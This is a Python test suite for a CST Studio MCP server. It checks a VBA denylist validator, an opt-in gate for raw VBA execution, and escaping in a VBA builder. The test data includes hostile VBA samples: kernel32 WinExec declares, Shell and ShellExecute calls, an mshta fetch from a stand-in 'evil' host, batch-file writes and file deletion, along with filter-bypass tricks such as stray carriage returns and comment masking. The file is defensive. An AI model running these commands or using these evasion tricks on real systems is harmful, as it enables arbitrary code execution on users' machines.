"""Raw VBA escape hatch: denylist validation and the CST_ALLOW_RAW_VBA opt-in gate."""

from __future__ import annotations

import json

import pytest

from cst_mcp.tools import vba as vba_tool
from cst_mcp.validators import ValidationError, raw_vba_enabled, validate_vba_input

BENIGN_HISTORY_VBA = """\
' build a substrate
Dim Name As String
Name = "sub"
With Brick
     .Reset
     .Name "substrate"
     .Component "component1"
     .Material "FR-4 (lossy)"
     .Xrange "-w/2", _
             "w/2"
     .Yrange "-l/2", "l/2"
     .Zrange "0", "h"
     .Create
End With
With Port
     .Reset
     .PortNumber "1"
     .Label ""
End With
"""


@pytest.mark.parametrize(
    "code",
    [
        'Declare PtrSafe Function WinExec Lib "kernel32" (ByVal cmd As String, ByVal n As Long) As Long',
        'Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal ms As Long)',
        'Declare Function WinExec Lib "kernel32" (ByVal c As String, ByVal n As Long) As Long',
        'Public Declare _\n  PtrSafe Function X Lib "user32" () As Long',
    ],
)
def test_declare_statements_blocked(code):
    with pytest.raises(ValidationError):
        validate_vba_input(code)


def test_line_continuation_open_for_output_blocked():
    code = 'Open "C:\\temp\\evil.bat" _\n    For Output As #1\nPrint #1, "x"\nClose #1'
    with pytest.raises(ValidationError):
        validate_vba_input(code)
    # CRLF continuation as well
    with pytest.raises(ValidationError):
        validate_vba_input(code.replace("\n", "\r\n"))


@pytest.mark.parametrize(
    "code",
    [
        'CallByName obj, "Run", VbMethod',
        'RunScript "C:\\x\\payload.bas"',
        'RunMacro "Some Macro"',
        'Application.Run "Macro1"',
        'Name "a.txt" As "b.txt"',
        'x = 1: Name "a.txt" As "b.txt"',
        "'#Uses \"evil.bas\"",
    ],
)
def test_indirect_execution_and_file_ops_blocked(code):
    with pytest.raises(ValidationError):
        validate_vba_input(code)


@pytest.mark.parametrize(
    "code",
    [
        BENIGN_HISTORY_VBA,
        '.Name "x"',
        "Dim Name As String",
        "Dim Name  As String, Size As Double",
        "Type T\n  Name As String\nEnd Type",
        'With Material\n .Name "Lib copper"\n .Create\nEnd With',
    ],
)
def test_benign_vba_passes(code):
    assert validate_vba_input(code) == code


class _FakeClient:
    def __init__(self, connected: bool) -> None:
        self.is_connected = connected
        self.calls: list[str] = []

    def execute_vba(self, code: str, history_label: str | None = None) -> dict:
        self.calls.append(code)
        return {"status": "executed", "label": "raw"}


async def _call(client, code):
    out = await vba_tool.handle("cst_execute_vba", {"code": code}, client)
    return json.loads(out[0].text)


@pytest.mark.asyncio
async def test_raw_vba_disabled_by_default_when_connected(monkeypatch):
    monkeypatch.delenv("CST_ALLOW_RAW_VBA", raising=False)
    assert raw_vba_enabled() is False
    client = _FakeClient(connected=True)
    data = await _call(client, BENIGN_HISTORY_VBA)
    assert data["status"] == "error"
    assert data["code"] == "raw_vba_disabled"
    assert "CST_ALLOW_RAW_VBA" in data["message"]
    assert client.calls == []


@pytest.mark.asyncio
@pytest.mark.parametrize("value", ["0", "false", "", "no"])
async def test_raw_vba_gate_rejects_non_truthy_values(monkeypatch, value):
    monkeypatch.setenv("CST_ALLOW_RAW_VBA", value)
    client = _FakeClient(connected=True)
    data = await _call(client, BENIGN_HISTORY_VBA)
    assert data["status"] == "error"
    assert client.calls == []


@pytest.mark.asyncio
async def test_raw_vba_offline_returns_script_without_gate(monkeypatch):
    monkeypatch.delenv("CST_ALLOW_RAW_VBA", raising=False)
    client = _FakeClient(connected=False)
    data = await _call(client, BENIGN_HISTORY_VBA)
    assert data["status"] == "offline"
    assert data["vba"] == BENIGN_HISTORY_VBA
    assert client.calls == []


@pytest.mark.asyncio
@pytest.mark.parametrize("value", ["1", "true", "TRUE"])
async def test_raw_vba_enabled_executes(monkeypatch, value):
    monkeypatch.setenv("CST_ALLOW_RAW_VBA", value)
    client = _FakeClient(connected=True)
    data = await _call(client, BENIGN_HISTORY_VBA)
    assert data["status"] == "executed"
    assert client.calls == [BENIGN_HISTORY_VBA]


@pytest.mark.asyncio
async def test_raw_vba_enabled_still_validates(monkeypatch):
    monkeypatch.setenv("CST_ALLOW_RAW_VBA", "1")
    client = _FakeClient(connected=True)
    data = await _call(
        client, 'Declare PtrSafe Function WinExec Lib "kernel32" (ByVal c As String, ByVal n As Long) As Long'
    )
    assert data["status"] == "error"
    assert "dangerous" in data["message"]
    assert client.calls == []


# --- Reviewer bypasses (review1/bypass.py) --------------------------------------------


@pytest.mark.parametrize(
    "code",
    [
        'RunAndWait "calc.exe"',
        'RunAndWait "C:/Windows/System32/mshta.exe http://evil/x.hta"',
        'RunAndWait "cmd /k calc"',
        'Open "C:/Users/Public/x.bat" As #1\nPut #1, , "calc"\nClose #1',
        'Open "x.bat" As 1',
        'If True Then Name "C:/a.txt" As "C:/b.txt"',
        'If False Then x = 1 Else Name "a" As "b"',
        '10 Name "a" As "b"',
        "'#Reference {420B2830-E718-11CF-893D-00A0C9054228}#1.0#0#C:/Windows/System32/scrrun.dll"
        "#Microsoft Scripting Runtime\nDim fso As New Scripting.FileSystemObject\nfso.DeleteFile \"C:/x\"",
        'Dim fso As New Scripting.FileSystemObject',
        "'#Language \"WWB.NET\"\nImports System.Diagnostics\nSub Main\n Process.Start(\"calc.exe\")\nEnd Sub",
        'Process.Start("notepad")',
        'Imports System.Diagnostics',
        "' #Uses \"evil.bas\"",
        'MacroRun "C:/Users/Public/evil.bas"',
        'ch = DDEInitiate("Excel","System")\nDDEExecute ch, "[EXEC(""calc"")]"',
        'ShellExecute 0, "open", "calc"',
        'AddClientCommandLine "calc.exe"',
        'x = VBA.Shell("calc")',
    ],
)
def test_reviewer_bypasses_blocked(code):
    with pytest.raises(ValidationError):
        validate_vba_input(code)


@pytest.mark.parametrize(
    "code",
    [
        'Private Declare _\rFunction WinExec Lib _\r"kernel32" (ByVal c As String, ByVal n As Long) As Long',
        'Open "C:/temp/evil.bat" _\r    For Output As #1',
        "x = 1\rShell \"calc\"",
    ],
)
def test_lone_cr_line_breaks_blocked(code):
    with pytest.raises(ValidationError):
        validate_vba_input(code)


@pytest.mark.parametrize(
    "code",
    [
        # Masking must not hide real code.
        'ReportInformation "it\'s fine": Shell "calc"',
        'ReportInformation "a ""quoted"" word": Kill "x"',
        'x = "abc""": Kill "x"',
        "' comment with a quote \" in it\nKill \"x\"",
        "' comment continued _\nKill \"x\"",
        'x = 1 _\nRem: Kill "x"',
        '[x"] : Shell "calc"',
        "['] Shell \"calc\"",
        'x = 1: Kill "y" \' trailing comment',
        'Sh\x00ell "calc"',
    ],
)
def test_masking_does_not_create_bypasses(code):
    with pytest.raises(ValidationError):
        validate_vba_input(code)


@pytest.mark.parametrize(
    "code",
    [
        'With Brick\n.Reset\n.Name "shell"\n.Component "enclosure"\n.Material "PEC"\n'
        '.Xrange "0","1"\n.Yrange "0","1"\n.Zrange "0","1"\n.Create\nEnd With',
        "' Kill the old mesh settings\nMesh.MeshType \"PBA\"",
        'Material.Name "Shell Glass"',
        'Solid.Delete "kill:body"',
        "' Name the port As needed\n",
        "Rem Name the port As needed, then Kill the rest",
        'x = 1: Rem Shell is only mentioned here',
        'ReportInformation "Open the file For Input later"',
        'ReportInformation "say ""Shell"" and ""Kill"""',
        'With ASCIIExport\n .Open\nEnd With',
        'Solid.Delete "comp:Name As x"',
    ],
)
def test_reviewer_false_positives_allowed(code):
    assert validate_vba_input(code) == code


# --- vba_builder string escaping -----------------------------------------------------


@pytest.mark.parametrize("value", ["a\nShell \"calc\"", "a\rb", "a\r\nb", "a\x00b"])
def test_builder_rejects_line_breaks_in_values(value):
    from cst_mcp.vba_builder import VBABuilder, _escape_vba_string

    with pytest.raises(ValueError):
        _escape_vba_string(value)
    with pytest.raises(ValueError):
        VBABuilder("Brick").set("Name", value)
    with pytest.raises(ValueError):
        VBABuilder("Solid").call_with_args("Delete", value)


def test_builder_comment_newlines_flattened():
    from cst_mcp.vba_builder import VBAScript

    out = VBAScript().add_comment("line one\nShell \"calc\"\r\nline three").build()
    assert "\n" not in out and "\r" not in out
    assert out.startswith("' ")
    validate_vba_input(out)  # it's all one comment


def test_builder_single_line_values_still_work():
    from cst_mcp.vba_builder import VBABuilder

    out = VBABuilder("Brick").set("Name", 'my "brick"').build()
    assert '.Name "my ""brick"""' in out
